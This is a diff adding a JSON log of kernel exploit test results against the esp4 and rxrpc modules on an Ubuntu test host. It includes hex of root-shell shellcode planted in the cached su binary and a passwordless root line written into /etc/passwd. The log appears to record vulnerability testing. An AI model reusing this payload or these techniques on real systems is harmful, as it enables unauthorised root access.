@@ -1,0 +1,35 @@
+{
+  "harness_version": "1.0",
+  "timestamp_utc": "2026-05-08T14:10:16Z",
+  "host": "sectestubuntu",
+  "kernel": "6.8.0-111-generic",
+  "modules": {
+    "esp4": "/lib/modules/6.8.0-111-generic/kernel/net/ipv4/esp4.ko.zst",
+    "rxrpc": "/lib/modules/6.8.0-111-generic/kernel/net/rxrpc/rxrpc.ko.zst"
+  },
+  "policy_pre": {
+    "apparmor_restrict_unprivileged_userns": 1,
+    "unprivileged_userns_clone": 1
+  },
+  "exp_sha256": "a133809a768c7c6b958d72ff6857677b14ed6bf284b99dc81a121442dfe04f90",
+  "esp": {
+    "exit_code": 124,
+    "su_pre_sha256": "c74311fe5636b7d7f9a56239fa8adeeab12ba86fe7d41b91afa85bf9bbdae78b",
+    "su_hex_after_exploit_first192": "7f454c4602010100000000000000000002003e0001000000780040000000000040000000000000000000000000000000000000004000380001000000000000000100000005000000000000000000000000004000000000000000400000000000b800000000000000b800000000000000001000000000000031ff31f631c0b06a0f05b0690f05b0740f056a00488d0512000000504889e2488d3d1200000031f66a3b580f055445524d3d787465726d002f62696e2f7368000000000000000000",
+    "entry_bytes_at_0x78": "31ff",
+    "page_cache_corrupted": true,
+    "su_post_drop_sha256": "0c0f135fc99e6f54e54bfc13dc9512e86872e4029a31d274a73847805ccd68a4",
+    "su_hex_post_drop_first192": "7f454c4602010100000000000000000002003e0001000000780040000000000040000000000000000000000000000000000000004000380001000000000000000100000005000000000000000000000000004000000000000000400000000000b800000000000000b800000000000000001000000000000031ff31f631c0b06a0f05b0690f05b0740f056a00488d0512000000504889e2488d3d1200000031f66a3b580f055445524d3d787465726d002f62696e2f7368000000000000000000",
+    "on_disk_intact": false,
+    "dmesg_tail": "[602790.650436] Initializing XFRM netlink socket\[602797.991660] process 'su' launched '/bin/sh' with NULL argv: empty string added\"
+  },
+  "rxrpc": {
+    "exit_code": 124,
+    "passwd_pre_sha256": "0ec9662a0d806f5415e0d09f337fb847c772b4091eee2ce9431da6c6335bc29c",
+    "passwd_hex_after_exploit_first32": "726f6f743a3a303a303a97ca8794b33a2f726f6f743a2f62696e2f626173680a",
+    "page_cache_corrupted": true,
+    "passwd_post_drop_sha256": "0ec9662a0d806f5415e0d09f337fb847c772b4091eee2ce9431da6c6335bc29c",
+    "on_disk_intact": true,
+    "dmesg_tail": "[602836.700053] NET: Registered PF_RXRPC protocol family\[602836.700080] Key type rxrpc registered\[602836.700084] Key type rxrpc_s registered\[602842.228639] [exp   ]     verify = -71\[602842.751252] [exp   ]     verify = -71\[602843.273752] [exp   ]     verify = -71\"
+  }
+}
